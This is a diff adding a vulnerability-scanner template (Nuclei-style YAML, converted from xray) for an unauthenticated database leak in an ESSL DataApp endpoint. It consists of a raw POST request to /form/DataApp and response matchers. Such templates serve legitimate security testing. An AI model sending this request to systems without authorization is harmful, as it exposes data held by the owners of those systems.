@@ -1,0 +1,28 @@
+id: poc-yaml-essl-dataapp-unauth-db-leak
+
+info:
+  name: poc-yaml-essl-dataapp-unauth-db-leak
+  author: sharecast
+  severity: critical
+  tags: xray-converted,unauth,exposure,ct-442594
+  reference:
+    - https://nosec.org/home/detail/3032.html
+
+http:
+  - raw:
+      - |
+        POST /form/DataApp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        style=1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ZK"
